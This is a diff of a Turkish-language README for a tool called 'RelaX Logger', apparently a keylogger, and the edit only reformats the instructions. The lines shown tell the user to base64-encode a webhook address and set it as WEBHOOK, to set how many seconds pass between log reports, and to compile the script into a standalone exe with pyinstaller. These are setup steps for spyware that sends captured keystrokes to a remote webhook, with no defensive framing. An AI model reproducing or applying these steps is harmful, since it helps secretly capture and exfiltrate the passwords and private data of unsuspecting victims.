@@ -28,10 +28,10 @@ https://www.base64encode.org/ Adresine Gidip Üste Yapıştırıp Encode Deyin.
 Sonra Altta Çıkan Base64 Kodunu Kopyalayın.
 
 Ardından RelaX Logger.py Dosyasına Sağ Tıklayıp Txt İle Açın 
-
+```
 SEND_REPORT_EVERY = 20 #Buraya Kaç Saniye Aralıkla Log Almak İsterseniz Onu Yazın
 WEBHOOK = "" # Tırnak İçine Kopyaladığnız Base 64 Kodunu Yazın.
- 
+ ```
 Evet Bitti.
 
 [[[Eğer Exe'ye Çevirmek İsterseniz!]]]
@@ -40,7 +40,6 @@ Evet Bitti.
 
 pip install pyinstaller
 
-Sonra
 🔻🔻🔻[BUNDA CMD AÇILIR]🔻🔻🔻
 ```
 pyinstaller --onefile RelaX Logger.py
